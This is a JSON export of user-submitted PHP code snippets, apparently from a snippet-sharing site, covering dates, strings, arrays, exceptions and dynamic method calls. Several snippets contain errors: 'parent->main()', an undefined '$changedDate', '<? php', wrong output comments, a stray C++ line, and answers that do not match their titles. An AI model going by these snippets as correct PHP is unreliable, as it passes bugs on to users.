    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3190,
    "keyword": null,
    "link": null,
    "title": " php artisan ui  auth",
    "description": "//Run the bolow commands to install laravel ui package composer require laravel/ui php artisan ui vue --auth npm install && npm run dev\ncomposer require laravel/ui php artisan ui vue --auth \ncomposer require laravel/ui  php artisan ui bootstrap  php artisan ui bootstrap --auth  npm install && npm run dev\n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3191,
    "keyword": null,
    "link": null,
    "title": " php assign value to object",
    "description": "// $object->property = 'value';  // assigning a string $person->first_name = 'John'; $person->last_name = \"Doe\";  // assigning a number - notice we don't have quotes around 32 $person->age = 32;\n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3192,
    "keyword": null,
    "link": null,
    "title": " php assign value to variable with default",
    "description": "$default_carat_min = $_COOKIE[\"diamond-search_caratMin\"] ?: \"0.25\";\n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3193,
    "keyword": null,
    "link": null,
    "title": " php auto scoll page with output",
    "description": "<script> var scroller = setInterval(function() {       window.scrollTo(0,document.body.scrollHeight); }, 10); // update every 10 ms, change at will </script> <?php // generate 1000 lines of html code for($i=0; $i<1000; $i++){     echo $i . \"<br>\";     ob_flush(); // flush out the output as we go     flush(); // same     usleep(10000); // add some delay to see it in action   }  ?>  <script> clearInterval(scroller); // stop updating so that you can scroll up  </script> \n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3194,
    "keyword": null,
    "link": null,
    "title": " php base64img to file",
    "description": "function base64_to_jpeg($base64_string, $output_file) {     // open the output file for writing     $ifp = fopen( $output_file, 'wb' );       // split the string on commas     // $data[ 0 ] == \"data:image/png;base64\"     // $data[ 1 ] == <actual base64 string>     $data = explode( ',', $base64_string );      // we could add validation here with ensuring count( $data ) > 1     fwrite( $ifp, base64_decode( $data[ 1 ] ) );      // clean up the file resource     fclose( $ifp );       return $output_file;  }\n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3195,
    "keyword": null,
    "link": null,
    "title": " php beautify json",
    "description": "echo json_encode($data, JSON_PRETTY_PRINT); \n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3196,
    "keyword": null,
    "link": null,
    "title": " php begin",
    "description": "<?php    ?>\n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3197,
    "keyword": null,
    "link": null,
    "title": " php begin tag",
    "description": "<?php    ?>\n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3198,
    "keyword": null,
    "link": null,
    "title": " php begintag",
    "description": "<?php    ?>\n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3199,
    "keyword": null,
    "link": null,
    "title": " php best debugging functions",
    "description": " I am using two ways to debug code  one is print the data and die the function in specific point.        print_r($data);die;  second one is writing log file in specific point in code.  function write_log($log_msg) {     $log_filename = \"logs\";     if (!file_exists($log_filename))      {         mkdir($log_filename, 0777, true);     }     $log_file_data = $log_filename.'/debug.log';   file_put_contents($log_file_data, $log_msg . \"\\n\", FILE_APPEND);      }   write_log(\"Writing Log\"); $a = array(         array('id' => '1','date' => '09-04-2018','length' => '10'),         array('id' => '2','date' => '09-04-2018','length' => '20'),         array('id' => '1','date' => '10-04-2018','length' => '11')     ); write_log(print_r($a,1)); \n<?php $myVar = \"hello world!\";  var_dump($myVar); print_r($myVar);  $allVars = get_defined_vars(); print_r($allVars); debug_zval_dump($allVars);  function sayHello($hello) {     echo $hello;     debug_print_backtrace(); }  sayHello($myVar); ?>\n I find it very useful to print out to the browsers console instead of just var_dumping:  function console_log( $data ){   echo '<script>';   echo 'console.log('. json_encode( $data ) .')';   echo '</script>'; }  Usage: $myvar = array(1,2,3); console_log( $myvar ); // [1,2,3] \n A good example of data output to the console via <script> tags, I myself used this first, but he broke the captcha job, because <script> tags were inserted into the base64 code of the captcha picture. Then I began to display logs in the headers with such a function (it may help someone else, in a similar situation):  <?php  function header_log($data){   $bt = debug_backtrace();   $caller = array_shift($bt);   $line = $caller['line'];   $file = array_pop(explode('/', $caller['file']));   header('log_'.$file.'_'.$caller['line'].': '.json_encode($data)); }  ?>  Usage: $myvar = array(1,2,3); header_log( $myvar ); // in headers we see: log_filename_rownumber: [1,2,3] \n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3200,
    "keyword": null,
    "link": null,
    "title": " php biggest int",
    "description": "PHP_INT_MAX\n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3201,
    "keyword": null,
    "link": null,
    "title": " php boolean to string",
    "description": "/** filter_var - Filters a variable with a specific filter **/ $boolvar = filter_var('true', FILTER_VALIDATE_BOOLEAN); /** boolval - Get the boolean value of a variable PHP 5 >= */ $boolvar = boolval ('true'); // And literally with a ternary operator but I can't recommend it $boolvar = ($string === 'true')  ? true: false;   /** We can convert any variable to boolean --- using the (bool) or (boolean) keyword ----- *** But we are talking about conversion not casting *** -   So any String whose length is greater than 0 is true  -   and any number other than 0 is true **/ echo $boolvar = (bool)1; //return true echo $boolvar = (bool)\"true\"; //return true echo $boolvar = (bool)\"false\"; //return true echo $boolvar = (bool)0; //return false echo $boolvar = (bool)\"\"; //return false  var_dump((bool) 0);//return false  var_dump((bool) \"\");//return false \nboolval('false');\n/**  * Strings always evaluate to boolean true unless they have a  * value that's considered \"empty\" by PHP (taken from the  * documentation for empty):  * \"\" (an empty string) evaluates as false.  * \"0\" (0 as a string) evaulates as false.  * If you need to set a boolean based on the text value of a  * string, then you'll need to check for the presence or  * otherwise of that value.  */ $boolean = $string === 'true' ? true: false;\n// (PHP 5 >= 5.5.0, PHP 7) // boolval &mdash; Get the boolean value of a variable boolval ( mixed $var ) : bool // Returns the boolean value of var.\n$converted_res = $res ? 'true' : 'false';\n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3202,
    "keyword": null,
    "link": null,
    "title": " php button click function",
    "description": "if(isset($_POST['button1'])) {  \t\t\techo \"This is Button1 that is selected\";  \t\t} \n<!DOCTYPE html>  <html>  \t <head>  \t<title>  \t\tHow to call PHP function  \t\ton the click of a Button ?  \t</title>  </head>   <body style=\"text-align:center;\">  \t \t<h1 style=\"color:green;\">  \t\tGeeksforGeeks  \t</h1>  \t \t<h4>  \t\tHow to call PHP function  \t\ton the click of a Button ?  \t</h4>   \t<?php \t \t\tif(isset($_POST['button1'])) {  \t\t\techo \"This is Button1 that is selected\";  \t\t}  \t\tif(isset($_POST['button2'])) {  \t\t\techo \"This is Button2 that is selected\";  \t\t}  \t?>  \t \t<form method=\"post\">  \t\t<input type=\"submit\" name=\"button1\" \t\t\t\tvalue=\"Button1\"/>  \t\t \t\t<input type=\"submit\" name=\"button2\" \t\t\t\tvalue=\"Button2\"/>  \t</form>  </head>   </html>  \n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3203,
    "keyword": null,
    "link": null,
    "title": " php button onclick",
    "description": "if(isset($_POST['button1'])) {  \t\t\techo \"This is Button1 that is selected\";  \t\t} \n<!DOCTYPE html>  <html>  \t <head>  \t<title>  \t\tHow to call PHP function  \t\ton the click of a Button ?  \t</title>  </head>   <body style=\"text-align:center;\">  \t \t<h1 style=\"color:green;\">  \t\tGeeksforGeeks  \t</h1>  \t \t<h4>  \t\tHow to call PHP function  \t\ton the click of a Button ?  \t</h4>   \t<?php \t \t\tif(isset($_POST['button1'])) {  \t\t\techo \"This is Button1 that is selected\";  \t\t}  \t\tif(isset($_POST['button2'])) {  \t\t\techo \"This is Button2 that is selected\";  \t\t}  \t?>  \t \t<form method=\"post\">  \t\t<input type=\"submit\" name=\"button1\" \t\t\t\tvalue=\"Button1\"/>  \t\t \t\t<input type=\"submit\" name=\"button2\" \t\t\t\tvalue=\"Button2\"/>  \t</form>  </head>   </html>  \n<!DOCTYPE HTML> <html> <?php   function runMyFunction() {     echo 'I just ran a php function';   }    if (isset($_GET['hello'])) {     runMyFunction();   } ?>  Hello there! <a href='index.php?hello=true'>Run PHP Function</a> </html> \n",
    "reg_date": "2021-10-12T10:17:35.000Z"
  },
  {
    "id": 3204,
    "keyword": null,
    "link": null,
    "title": " php calculate date difference",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3205,
    "keyword": null,
    "link": null,
    "title": " php calculate percentage",
    "description": "$percentage = 50; $totalWidth = 350;  $new_width = ($percentage / 100) * $totalWidth;\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3206,
    "keyword": null,
    "link": null,
    "title": " php call class dynamically",
    "description": "class Player {     public function SayHi() { print(\"Hi\"); } } $player = new Player();  call_user_func(array($player, 'SayHi')); // or $player->{'SayHi'}(); // or $method = 'SayHi'; $player->$method();\n//  Non static call call_user_func( array( $obj, 'method' ) );  //  Static calls call_user_func( array( 'ClassName', 'method' ) ); call_user_func( 'ClassName::method' ); // (As of PHP 5.2.3) \n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3207,
    "keyword": null,
    "link": null,
    "title": " php call class method by string",
    "description": "class Player {     public function SayHi() { print(\"Hi\"); } } $player = new Player();  call_user_func(array($player, 'SayHi')); // or $player->{'SayHi'}(); // or $method = 'SayHi'; $player->$method();\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3208,
    "keyword": null,
    "link": null,
    "title": " php call dynamic function",
    "description": "//Simple $vFn = \"Login\"; $vFn();  //OR call_user_func($vFn, $vars); //Returns the return value of the callback.  //Best abstract class mBase { \tpublic function main() {     \t.....   \t} }  class mA extends mBase { \tpublic function main() {     \tparent->main();     \t.....   \t} }  class mB extends mBase {   \tpublic function main() {     \tparent->main();     \t.....   \t} } function runMM(mBase $module) {   $module->main(); } $m = 'mB'; //example runMM ($m);\n$function = $prefix . '_custom_type_init'; if(function_exists($function)) {   $function(); }\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3209,
    "keyword": null,
    "link": null,
    "title": " php call method from string",
    "description": "class Player {     public function SayHi() { print(\"Hi\"); } } $player = new Player();  call_user_func(array($player, 'SayHi')); // or $player->{'SayHi'}(); // or $method = 'SayHi'; $player->$method();\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3210,
    "keyword": null,
    "link": null,
    "title": " php call parent constructor",
    "description": " <?php class BaseClass {     function __construct() {         print \"In BaseClass constructor\\n\";     } }  class SubClass extends BaseClass {     function __construct() {         parent::__construct();         print \"In SubClass constructor\\n\";     } }  class OtherSubClass extends BaseClass {     // inherits BaseClass's constructor }  // In BaseClass constructor $obj = new BaseClass();  // In BaseClass constructor // In SubClass constructor $obj = new SubClass();  // In BaseClass constructor $obj = new OtherSubClass(); ?>  \n<?php class BaseClass {    function __construct() {        print \"En el constructor BaseClass\\n\";    } }  class SubClass extends BaseClass {    function __construct() {        parent::__construct();        print \"En el constructor SubClass\\n\";    } }\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3211,
    "keyword": null,
    "link": null,
    "title": " php call static method from class",
    "description": "class static_test_class {     public static function test() {         echo \"Original class\\n\";     }      public static function run($use_self) {         if($use_self) {             self::test();         } else {             $class = get_called_class();             $class::test();          }     } }  class extended_static_test_class extends static_test_class {     public static function test() {         echo \"Extended class\\n\";     } }  extended_static_test_class::run(true); extended_static_test_class::run(false);\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3212,
    "keyword": null,
    "link": null,
    "title": " php camelcase to snake case",
    "description": "echo ucwords(\"hello world\"); \nfunction from_camel_case($input) {   $pattern = '!([A-Z][A-Z0-9]*(?=$|[A-Z][a-z0-9])|[A-Za-z][a-z0-9]+)!';   preg_match_all($pattern, $input, $matches);   $ret = $matches[0];   foreach ($ret as &$match) {     $match = $match == strtoupper($match) ?       \tstrtolower($match) :     \tlcfirst($match);   }   return implode('_', $ret); }  // Tests: foreach ([   'simpleTest' => 'simple_test',   'easy' => 'easy',   'HTML' => 'html',   'simpleXML' => 'simple_xml',   'PDFLoad' => 'pdf_load',   'startMIDDLELast' => 'start_middle_last',   'AString' => 'a_string',   'Some4Numbers234' => 'some4_numbers234',   'TEST123String' => 'test123_string', ] as $test => $result) {   $output = from_camel_case($test);   if ($output === $result) {     echo \"Pass: $test => $result\\n\";   } else {     echo \"Fail: $test => $result [$output]\\n\";   } } /* Pass: simpleTest => simple_test Pass: easy => easy Pass: HTML => html Pass: simpleXML => simple_xml Pass: PDFLoad => pdf_load Pass: startMIDDLELast => start_middle_last Pass: AString => a_string Pass: Some4Numbers234 => some4_numbers234 Pass: TEST123String => test123_string */\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3213,
    "keyword": null,
    "link": null,
    "title": " php can't upload gif",
    "description": "Check your file size limit. If you use XAMPP, open your \"php.ini\" file and  search (CTRL+F) for \"filesize\", then change the limit to whatever you want. save the changes and restart apache.    You now should be able to upload bigger files.\nVersuchen Sie in der 'php.ini'(XMAPP/apache/php) Datei die 'filesize' zu vergr&ouml;ssern.  Gifs, welche zu gross sind werden vom Apache Webserver nicht angenommen.\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3214,
    "keyword": null,
    "link": null,
    "title": " php capital string",
    "description": "<?php echo strtoupper(\"Hello WORLD!\"); ?>\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3215,
    "keyword": null,
    "link": null,
    "title": " php capitalize first letter",
    "description": " <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?>  \n <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \nucwords(\"hello world\"); // Hello World ucfirst(\"hello world\"); // Hello world\n$clientname = \"ankur prajapati\"; ucwords($clientname);//Ankur Prajapati ucfirst($clientname);//Ankur Prajapati  $clientname = \"ANKUR PRAJAPATI\"; ucfirst(strtolower($clientname));//Ankur Prajapati\nstring str = \"something\"; str[0] = toupper(str[0]);\nucfirst(\"hello world!\");\n",
    "reg_date": "2021-10-12T10:17:36.000Z"
  },
  {
    "id": 3216,
    "keyword": null,
    "link": null,
    "title": " php carbon from timestamp",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n Carbon::now()->timestamp\nCarbon::createFromTimestamp(1616013398)\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3217,
    "keyword": null,
    "link": null,
    "title": " php carbon get timestamp",
    "description": " Carbon::now()->timestamp\nCarbon::createFromTimestamp(1616013398)\n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3218,
    "keyword": null,
    "link": null,
    "title": " php case switch",
    "description": "switch (fruit) {   case apple:     code to be executed if fruit=apple;     break;   case banana:     code to be executed if fruit=banana;     break;     ...   default:     code to be executed if fruit is different from all fruits; }\n$age=20; switch ($age) { \tcase 19:         echo \"Age is 18\";         break;     case 20:         echo \"Age is 20\";         break;     case 21:         echo \"Age is 21\";         break; }\n$fruit = \"apple\"; switch ($fruit) {   case \"apple\":     echo \"doctor\";     break;   case \"banana\":     echo \"monkey\";     break;   default:    \techo \"things\"; }//doctor\nswitch ($element) {     case 0:         echo \"i es igual a 0\";         break;     case 1:         echo \"i es igual a 1\";         break;     case 2:         echo \"i es igual a 2\";         break; }\nswitch ($i) {     case 0:         echo \"i ist gleich 0\";         break;     case 1:         echo \"i ist gleich 1\";         break;     case 2:         echo \"i ist gleich 2\";         break; }\n<?php if ($i == 0) {     echo \"i equals 0\"; } elseif ($i == 1) {     echo \"i equals 1\"; } elseif ($i == 2) {     echo \"i equals 2\"; }  switch ($i) {     case 0:         echo \"i equals 0\";         break;     case 1:         echo \"i equals 1\";         break;     case 2:         echo \"i equals 2\";         break; } ?>\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3219,
    "keyword": null,
    "link": null,
    "title": " php catch exception",
    "description": "function inverso($x) {     if (!$x) {         throw new Exception('Zero division.');     }     return 1/$x; }  try {     echo inverso(5) . \"\\n\";     echo inverso(0) . \"\\n\"; } catch (Exception $e) {     echo 'and the error is: ',  $e->getMessage(), \"\\n\"; }\n <?php  function test() {     try {         throw new Exception('foo');     } catch (Exception $e) {         return 'catch';     } finally {         return 'finally';     } }  echo test(); ?>  \n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \nTry catch comes under exception handeling concept where using this we control the runtime error and modify the message as we want.  // function created with exception throw function checkdata($number){ \tif($number > 10){     \tthrow new Exception(\"Number is greater than 10\");     }     return true; }  // try block starts try{ \tcheckdata(15);   \techo \"The number is below 10\"; } // catch block catch(Exception $e){ \techo \"Message :\".$e->getMessage(); }  In above code if condition is not satisfied then it will throw exception and which gets caught by catch block and show the error message. \ntry { } catch(Exception $e) { }\ntry {     // Some code... } catch(AError | BError $e) {     // Handle exceptions } catch(Exception $e) {     // Handle the general case }\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3220,
    "keyword": null,
    "link": null,
    "title": " php catch fatal error",
    "description": "try {    do some thing evil } catch (Error $e) {    echo 'Now you can catch me!'; }\n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3221,
    "keyword": null,
    "link": null,
    "title": " php change an associative array into indexed array",
    "description": "$array = array_values($array); \n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3222,
    "keyword": null,
    "link": null,
    "title": " php change array into comma delimited string",
    "description": "$arr = array ( 0 => \"lorem\", 1 => \"ipsum\", 2 => \"dolor\");  $str = implode (\", \", $arr);\n $tags = implode(', ', array('tag1','tag2','tag3','tag4'));\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3223,
    "keyword": null,
    "link": null,
    "title": " php change date format",
    "description": "To convert the date-time format PHP provides strtotime() and date() function. We change the date format from one format to another.  Change YYYY-MM-DD to DD-MM-YYYY <? php. $currDate = \"2020-04-18\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo \"Changed date format is: \". $changeDate. \" (MM-DD-YYYY)\"; ?>\n$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n$currDate = \"2020-08-25\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo $changedDate;\n$var = '20/04/2012'; $date = str_replace('/', '-', $var); echo date('Y-m-d', strtotime($date));\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3224,
    "keyword": null,
    "link": null,
    "title": " php change date format from d/m/y to y-m-d",
    "description": "$date = DateTime::createFromFormat('d/m/Y', \"24/04/2012\"); echo $date->format('Y-m-d');\n$old_date = date('l, F d y h:i:s');              // returns Saturday, January 30 10 02:06:34 $old_date_timestamp = strtotime($old_date); $new_date = date('Y-m-d H:i:s', $old_date_timestamp);    \n$var = '20/04/2012'; $date = str_replace('/', '-', $var); echo date('Y-m-d', strtotime($date));\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3225,
    "keyword": null,
    "link": null,
    "title": " php change sting to caps",
    "description": "$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\n<?php /* There is a function in php wich convert all string to uppercase */    echo strtoupper(\"Hello samy! how are u ?\");   // output :   HELLO SAMY! HOW ARE U ? ?>\n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase;\n",
    "reg_date": "2021-10-12T10:17:37.000Z"
  },
  {
    "id": 3226,
    "keyword": null,
    "link": null,
    "title": " php change timezone",
    "description": "date_default_timezone_set(\"Asia/Kolkata\"); // List of Supported Timezones https://www.php.net/manual/en/timezones.php\ndate_default_timezone_set('America/Los_Angeles'); \n<?php $date = new DateTime(\"now\", new DateTimeZone('America/New_York') ); echo $date->format('Y-m-d H:i:s');\n$date = new \\DateTime(); $date->setTimezone(new \\DateTimeZone('+0800')); //GMT echo $date->format('Y-m-d H:i:s'); // 2020-11-20 15:23:49\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3227,
    "keyword": null,
    "link": null,
    "title": " php changr date format",
    "description": "$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3228,
    "keyword": null,
    "link": null,
    "title": " php chech if string contains",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n// this method is new with PHP 8 and above $haystack = \"Damn, I wonder if this string contains a comma.\"; if (str_contains($haystack, \",\")) { \techo \"There is a comma!!\"; }\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3229,
    "keyword": null,
    "link": null,
    "title": " php check array is not associative",
    "description": "count(array_filter(array_keys($array), 'is_string')) === 0\n// return true if array is associative function checkAssoc($array) {     $nonAssociative = count(array_filter(array_keys($array), 'is_string')) === 0;     if ($nonAssociative) {         return false;     } else {         return true;     } } // Example $array = [\"el1\" => 1, \"el2\" => 2, \"el3\" => 3]; checkAssoc($array); // bool(true)\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3230,
    "keyword": null,
    "link": null,
    "title": " php check credit card expiration",
    "description": "$expires = DateTime::createFromFormat('my', $_POST['expMonth'].$_POST['expYear']); $now     = new DateTime();  if ($expires < $now) {     echo 'Expired!'; }\n$expires =  date_format( \\DateTime::createFromFormat('ym', $cc_expiration),\"ym\");  $now =  date_format(new \\DateTime(),\"ym\");  if ($expires < $now) {     return 'Expired!'; }\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3231,
    "keyword": null,
    "link": null,
    "title": " php check for empty string",
    "description": "if (empty($var)) {     echo '$var is either 0, empty, or not set at all'; }\nfunction strictEmpty($var) {      // Delete this line if you want space(s) to count as not empty     $var = trim($var);          if(isset($var) === true && $var === '') {              // It's empty          }     else {              // It's not empty          }  }\nempty var php\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3232,
    "keyword": null,
    "link": null,
    "title": " php check for null",
    "description": "// The is_null() function checks whether a variable is NULL or not. This function returns true (1) if the variable is NULL, otherwise it returns false/nothing.  <?php     $var = NULL;   \tif (is_null($var)) {       \techo \"yes, is null\";            } else {       \techo \"not null\";     } ?>   \nis_null($foo)\n<?php    \t$var = NULL;    ?>\nis_null($var)\n $country = $session?->user?->getAddress()?->country;  \n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3233,
    "keyword": null,
    "link": null,
    "title": " php check how much time each instruction takes to complete",
    "description": "$start = microtime(true); while (...) {  } $time_elapsed_secs = microtime(true) - $start;\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3234,
    "keyword": null,
    "link": null,
    "title": " php check if all array values are the same",
    "description": "if(count(array_unique($array)) === 1) {     // all values in $array are the same } else {     // at least 1 value in $array is different }\n// All values are equal if (count(array_unique($allvalues)) === 1 && end($allvalues) === 'true') {  }  // Check the thing you don't want if (in_array('false', $allvalues, true)) {  }\n1. Check if all values are equal without knowing the values from array: $array = array('true', 'true', 'true'); if((count(array_unique($array)) === 1)) {   echo \"all equal\"; } else {   echo \"not equal\"; }  2. Check if all values are equal when you know the value from array: - In this case we know the equal value should be \"true\"  $array = array('true', 'true', 'true'); if (count(array_unique($array)) === 1 && end($array) === 'true') { }\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3235,
    "keyword": null,
    "link": null,
    "title": " php check if all values in array are equal",
    "description": "if(count(array_unique($array)) === 1) {     // all values in $array are the same } else {     // at least 1 value in $array is different }\n// All values are equal if (count(array_unique($allvalues)) === 1 && end($allvalues) === 'true') {  }  // Check the thing you don't want if (in_array('false', $allvalues, true)) {  }\n$allvalues = array('true', 'true', 'true'); if (count(array_unique($allvalues)) === 1 && end($allvalues) === 'true') { }\nif(count(array_unique($array, SORT_REGULAR)) < count($array)) {     // $array has duplicates } else {     // $array does not have duplicates }\n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3236,
    "keyword": null,
    "link": null,
    "title": " php check if any of multiple values in array",
    "description": "function in_array_any($needles, $haystack) {    return !empty(array_intersect($needles, $haystack)); }  echo in_array_any( [3,9], [5,8,3,1,2] ); // true, since 3 is present echo in_array_any( [4,9], [5,8,3,1,2] ); // false, neither 4 nor 9 is present \n// All values are equal if (count(array_unique($allvalues)) === 1 && end($allvalues) === 'true') {  }  // Check the thing you don't want if (in_array('false', $allvalues, true)) {  }\nif(count(array_unique($array, SORT_REGULAR)) < count($array)) {     // $array has duplicates } else {     // $array does not have duplicates }\n$uniqueKeys = array_unique($list[0])  foreach ($uniqueKeys as $uniqueKey) {   $v = array_keys($list[0], $uniqueKey);    if (count($v) > 1)   {     foreach ($v as $key)     {       // Work with $list[0][$key]     }    } } \n",
    "reg_date": "2021-10-12T10:17:38.000Z"
  },
  {
    "id": 3237,
    "keyword": null,
    "link": null,
    "title": " php check if class exists",
    "description": "if(class_exists('dbinfo')){\n      if(class_exists('dbinfo')){ \n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3238,
    "keyword": null,
    "link": null,
    "title": " php check if date is bigger than today",
    "description": "<?php  $date_now = new DateTime();  $date2    = new DateTime(\"01/02/2016\");  if ($date_now > $date2) {     echo 'greater than'; }else{     echo 'Less than'; }\n<?php  $date_now = date(\"Y-m-d\"); // this format is string comparable  if ($date_now > '2016-01-02') {     echo 'greater than'; }else{     echo 'Less than'; }\n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3239,
    "keyword": null,
    "link": null,
    "title": " php check if date is older than 1 month",
    "description": "$future_timestamp = strtotime(\"+1 month\"); $data = date('Y-m-d', $future_timestamp);\n if(strtotime('2011-08-19 17:14:40') < strtotime('-30 days')) {      // this is true  } \n// function cal_days_in_month(calendar,month,year); //e.g. $d=cal_days_in_month(CAL_GREGORIAN,10,2005); echo \"There was $d days in October 2005\";\n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3240,
    "keyword": null,
    "link": null,
    "title": " php check if file exists",
    "description": "<?php $filename = '/path/to/foo.txt';  if (file_exists($filename)) {     echo \"The file $filename exists\"; } else {     echo \"The file $filename does not exist\"; } ?>\nif (!file_exists('http://mysite.com/images/thumbnail_1286954822.jpg')) {    $filefound = '0';                          }\nif (file_exists($filePath)) {   // todo acction }\nfile_exists ( string $filename ) : bool\n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3241,
    "keyword": null,
    "link": null,
    "title": " php check if file is video",
    "description": "$mime = mime_content_type($file); if(strstr($mime, \"video/\")){     // this code for video }else if(strstr($mime, \"image/\")){     // this code for image }\n",
    "reg_date": "2021-10-12T10:17:39.000Z"
